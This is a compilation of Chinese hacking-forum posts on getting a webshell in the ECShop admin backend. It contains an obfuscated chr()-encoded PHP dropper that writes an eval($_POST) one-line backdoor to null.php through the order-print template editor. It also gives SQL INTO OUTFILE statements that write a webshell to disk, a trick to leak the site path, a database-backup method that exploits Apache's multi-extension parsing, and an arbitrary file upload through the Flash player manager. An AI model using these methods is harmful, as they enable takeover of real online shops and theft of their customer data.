/////////////////////////
ecshop后台获取shell最新方法，通杀最新版本&后台低权限

后台可以提交构造代码绕过过滤,成功解析生成一句话木马.
详细说明：
<?php
$filen=chr(46).chr(46).chr(47).chr(110).chr(117).chr(108).chr(108).chr(46).chr(112).chr(104).chr(112);
$filec=chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(117).chr(115).chr(98).chr(93).chr(41).chr(59).chr(63).chr(62);
$a=chr(119);
$fp=@fopen($filen,$a);
$msg=@fwrite($fp,$filec);
if($msg) echo chr(79).chr(75).chr(33);
@fclose($fp);
?>
后台-订单管理-订单打印-选择源代码编辑-保存
返回订单列表，随意选择一个订单打印，返回OK，生成一句话成功！
3.连接文件：
http://localhost/null.php
懒人就用下面的代码,连接文件为根目录下null.php,密码为 usb:



//////////////////////


作者:龙儿心[B.H.S.T]

看一个echsop的后台，版本未知。
网上流传的方法都测试了无用，可能是我没找全，无奈只好自己看下后台，发现此方法。
进入后台-系统设置-Flash播放器管理 看图


可以上传任意文件。
结束


-----------------

再说两种ecshop后台拿shell的方法 
2010, July 19, 10:35 AM. 黑友网文 Submitted by admin
ecshop后台拿shell的方法，除了oldjun大牛的那个和上次说的那个，又发现两种。但是各有个的限制条件，听我一一道来。
 
其一：
ecshop后台有一个功能是sql查询，如图：



其实感觉在一个管理系统的后台放这么个功能根本没用，有多少网站管理员有这么高的觉悟，会用这个？
不过也不错，便宜了我们小菜拿shell。
方法就像phpmyadmin一样直接操作sql语句导出一句话木马拿shell。
语句如下：
show databases;
use 数据库名;
 create a(cmd text not null);
 insert into a(cmd) values('<?php eval($_POST[cmd]);?>');
select cmd from a into outfile '导出路径';
drop table if exists a;
很常规的语句。也许有人会问不知道网站路径怎么办，那要导出到哪呢？这里有一个技巧就是 use 数据库名; 这句话，其实在这个sql查询功能中默认用的数据库就是本网站的数据库，开发者设计的时候不会考虑你去use 其他的数据库，所以这里你用"use 数据名库"这句时，会产生一个警告，但并不影响sql的运行，却可以成功爆出网站的路径，多次测试均成功，如图：


这样就爆出了路径，用于导出。
但是有个问题是你最后outfile文件时如果不是mysql的root权限，是没有权限导出的，所以这种方法必须要求你的mysql权限为root。
其二
另外一种是利用ecshop后台的数据库备份功能。如图：


这里选择自定义备份，目的是使你备份出来的文件尽量的小，要是太大的话也很麻烦。
然后去前台留个言，内容是我们的一句话木马，接着在后台选择备份ecs_feedback这张表，就是存放留言的表，如图：

然后会显示备份成功。
但是ecshop备份的文件都强行会在你填的备份的名字后面加上.sql扩展名(元备份名我填的是l4yn3.php)，如图。



这么做无非就是提高安全性，可是设计者忽略了一个问题，如果php是在apache下运行的，利用apache的文件解析漏洞这种方式形同虚设。
因为apache有个漏洞就是对文件名是1.php.sql这种形式，只要最后的文件扩展名是apache不能能解析的，他就会按照php文件来解析它，那在这里sql文件就是apache不能够解析的文件，那么他理所当然会把这个文件当作php文件来执行。
所以如果是apache+php的话，即使文件名变成了上面这样，也可以正常解析，你所需要做的就是点一下备份后的链接。
所以您看出来了，这种拿shell的方式是需要你的环境是apache+php的。
 而且还有个条件是GPC魔术转换不能开启，所以也很鸡肋。
两种方式没有上次说的那位大牛的那么通杀，只是给大家提供个思路，仅此而已。
由于之前是用shell测试的，可是写文章的时候是在本地测试，环境有点问题，第二种方式一句话成功解析的图就不截了，请见谅。
没什么技术，欢迎光临l4yn3的个人博客。

